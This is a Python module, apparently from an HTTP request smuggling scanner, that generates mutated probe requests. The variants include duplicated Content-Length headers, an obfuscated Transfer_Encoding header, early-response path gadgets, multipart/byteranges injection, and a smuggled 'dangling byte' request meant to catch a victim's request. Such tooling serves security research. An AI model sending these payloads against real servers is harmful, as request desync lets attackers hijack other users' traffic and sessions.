"""
Vector Permutation Engine:
Applies systematic mutations and permutations to candidate triggers
based on techniques discovered in the HTTP Terminator research paper.
"""

import random
import re
from typing import Any, Dict, List, Optional

from database import Database


class VectorPermutator:
    """
    Applies protocol transformations (early-response paths, header casing,
    tabs, dual-CL, multipart/byteranges, dangling bytes) to multiply probe novelty.
    """

    def __init__(self, db: Optional[Database] = None):
        self.db = db

    def permute_probe(self, base_probe: Dict[str, Any], max_variants: int = 5) -> List[Dict[str, Any]]:
        raw_req = base_probe.get("raw_request", "")
        if not raw_req:
            return []

        parent_id = base_probe.get("probe_id")
        variants: List[Dict[str, Any]] = []

        mutators = [
            self._mutate_path_nul,
            self._mutate_path_asterisk_gadget,
            self._mutate_header_tab_spacing,
            self._mutate_dual_matching_cl,
            self._mutate_header_casing_underscore,
            self._mutate_dangling_byte,
            self._mutate_multipart_byteranges,
        ]

        # Pick random mutators
        selected_mutators = random.sample(mutators, min(len(mutators), max_variants))

        for mutator in selected_mutators:
            mutated_req, mutation_name = mutator(raw_req)
            if mutated_req and mutated_req != raw_req:
                variant = {
                    "fragment_id": base_probe.get("fragment_id"),
                    "rationale": f"{base_probe.get('rationale', '')} [Permutation: {mutation_name}]",
                    "raw_request": mutated_req,
                    "is_clean": False if "dirty" in mutation_name else base_probe.get("is_clean", False),
                    "source_type": "permuted",
                    "parent_probe_id": parent_id,
                }
                if self.db:
                    p_id = self.db.save_probe(
                        fragment_id=variant["fragment_id"],
                        rationale=variant["rationale"],
                        raw_request=variant["raw_request"],
                        is_clean=variant["is_clean"],
                        source_type="permuted",
                        parent_probe_id=parent_id,
                    )
                    variant["probe_id"] = p_id
                variants.append(variant)

        return variants

    def _mutate_path_nul(self, req: str) -> (str, str):
        """Replaces root path with /nul to trigger early 400/404 responses (0.CL deadlock resolution)."""
        pattern = re.compile(r"^(GET|POST|HEAD|PUT|DELETE|OPTIONS)\s+/\s+(HTTP/1\.[01])", re.MULTILINE)
        if pattern.search(req):
            mutated = pattern.sub(r"\1 /nul \2", req, count=1)
            return mutated, "path_nul_early_response"
        return req, ""

    def _mutate_path_asterisk_gadget(self, req: str) -> (str, str):
        """Mutates to OPTIONS *?xyz gadget that triggers Apache early-response behavior."""
        lines = req.split("\r\n")
        if lines:
            first_line = lines[0]
            if "HTTP/" in first_line:
                lines[0] = "OPTIONS *?xyz HTTP/1.1"
                return "\r\n".join(lines), "apache_options_asterisk_gadget"
        return req, ""

    def _mutate_header_tab_spacing(self, req: str) -> (str, str):
        """Injects colon-tab spacing as discovered in 'Expect :\\t100-continue'."""
        if "\r\nHost:" in req:
            return req.replace("\r\nHost:", "\r\nHost :\t"), "header_colon_tab_spacing"
        return req, ""

    def _mutate_dual_matching_cl(self, req: str) -> (str, str):
        """
        Duplicates Content-Length header with identical values.
        Triggered the breakthrough NetScaler / SSO / Bank vulnerabilities in Kettle's paper.
        """
        cl_match = re.search(r"\r\n(Content-Length:\s*(\d+))", req, re.IGNORECASE)
        if cl_match:
            full_header = cl_match.group(1)
            # Duplicate header
            mutated = req.replace(f"\r\n{full_header}", f"\r\n{full_header}\r\n{full_header}", 1)
            return mutated, "clean_dual_matching_content_length"
        return req, ""

    def _mutate_header_casing_underscore(self, req: str) -> (str, str):
        """Transforms Transfer-Encoding into Transfer_Encoding or POsT casing."""
        mutated = req
        if "Transfer-Encoding:" in mutated:
            mutated = mutated.replace("Transfer-Encoding:", "Transfer_Encoding:")
            return mutated, "header_underscore_transfer_encoding"
        if "POST /" in mutated:
            mutated = mutated.replace("POST /", "POsT /")
            return mutated, "method_mixed_case_post"
        return req, ""

    def _mutate_dangling_byte(self, req: str) -> (str, str):
        """
        Applies Kettle's dangling byte technique to solve the stacked-response race condition.
        Missing 1 byte delays back-end response until victim request arrives.
        """
        if "$PAYLOAD" in req:
            # Inject a smuggled request with dangling byte: Content-Length: 1 with empty body
            dangling_marker = (
                "POST /dangling_smuggled HTTP/1.1\r\n"
                "Host: target.local\r\n"
                "Content-Length: 1\r\n\r\n"
            )
            return req.replace("$PAYLOAD", dangling_marker), "dangling_byte_stacked_response_bypass"
        return req, ""

    def _mutate_multipart_byteranges(self, req: str) -> (str, str):
        """Injects Content-Type: multipart/byteranges (responsible for 200+ vulnerable bank targets)."""
        if "\r\n\r\n" in req and "multipart/byteranges" not in req:
            header_insert = "Content-Type: multipart/byteranges; boundary=BOUND\r\n"
            mutated = req.replace("\r\n\r\n", f"\r\n{header_insert}\r\n", 1)
            return mutated, "multipart_byteranges_shared_parser_trigger"
        return req, ""
